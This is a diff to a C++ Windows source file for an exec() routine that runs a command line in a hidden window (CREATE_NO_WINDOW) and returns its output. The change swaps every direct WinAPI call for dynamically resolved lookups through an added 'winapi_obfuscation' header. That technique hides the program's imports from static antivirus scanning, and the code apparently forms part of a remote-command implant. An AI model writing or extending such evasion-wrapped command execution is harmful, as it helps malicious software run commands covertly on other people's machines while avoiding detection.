@@ -1,21 +1,23 @@
 #include <windows.h>
 #include <iostream>
 #include <string>
+#include "winapi_function_signatures.h"
+#include "winapi_obfuscation.h"
 
 namespace {
 	std::string GetLastErrorAsString()
 	{
 		LPSTR messageBuffer = nullptr;
-		DWORD errorMsgID = GetLastError();
+		DWORD errorMsgID = resolve_dynamically<GetLastError_t>("GetLastError")();
 
 		// Ask Win32 to give us the string version of that message ID.
-		size_t size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
+		size_t size = resolve_dynamically<FormatMessageA_t>("FormatMessageA")(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
 			NULL, errorMsgID, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), (LPSTR)&messageBuffer, 0, NULL);
 
 		// Copy the error message into a std::string.
 		std::string message(messageBuffer, size);
 
-		LocalFree(messageBuffer);
+		resolve_dynamically<LocalFree_t>("LocalFree")(messageBuffer);
 
 		return message;
 	}
@@ -35,12 +37,12 @@ namespace {
 		startInfo.dwFlags |= STARTF_USESTDHANDLES;
 
 		// Create the child process and run the command line
-		if (!CreateProcessA(NULL, (char*)command.c_str(), NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, &startInfo, &procInfo))
+		if (!resolve_dynamically<CreateProcessA_t>("CreateProcessA")(NULL, (char*)command.c_str(), NULL, NULL, true, CREATE_NO_WINDOW, NULL, NULL, &startInfo, &procInfo))
 			throw std::runtime_error(GetLastErrorAsString());
 
-		CloseHandle(procInfo.hProcess);
-		CloseHandle(procInfo.hThread);
-		CloseHandle(stdOutWrite);
+		resolve_dynamically<CloseHandle_t>("CloseHandle")(procInfo.hProcess);
+		resolve_dynamically<CloseHandle_t>("CloseHandle")(procInfo.hThread);
+		resolve_dynamically<CloseHandle_t>("CloseHandle")(stdOutWrite);
 	}
 }
 
@@ -57,11 +59,11 @@ std::string exec(std::string command)
 	securityAttr.lpSecurityDescriptor = NULL;
 
 	// Create an STDOUT Pipe for the child process
-	if (!CreatePipe(&stdOutRead, &stdOutWrite, &securityAttr, 0)) {
+	if (!resolve_dynamically<CreatePipe_t>("CreatePipe")(&stdOutRead, &stdOutWrite, &securityAttr, 0)) {
 		return "Error - CreatePipe() failed: " + GetLastErrorAsString();
 	}
 
-	if (!SetHandleInformation(stdOutRead, HANDLE_FLAG_INHERIT, 0)) {
+	if (!resolve_dynamically<SetHandleInformation_t>("SetHandleInformation")(stdOutRead, HANDLE_FLAG_INHERIT, 0)) {
 		return "Error - SetHandleInformation() failed: " + GetLastErrorAsString();
 	}
 
@@ -79,10 +81,10 @@ std::string exec(std::string command)
 	std::string commandResult = "";
 
 	memset(buf, 0, sizeof(buf));
-	while (ReadFile(stdOutRead, buf, sizeof(buf), &bytesRead, NULL) && bytesRead != 0) // while there are still bytes to read
+	while (resolve_dynamically<ReadFile_t>("ReadFile")(stdOutRead, buf, sizeof(buf), &bytesRead, NULL) && bytesRead != 0) // while there are still bytes to read
 		commandResult.append(buf, bytesRead);
 
-	CloseHandle(stdOutRead);
+	resolve_dynamically<CloseHandle_t>("CloseHandle")(stdOutRead);
 
 	// Return the result from STDOUT
 	return commandResult;
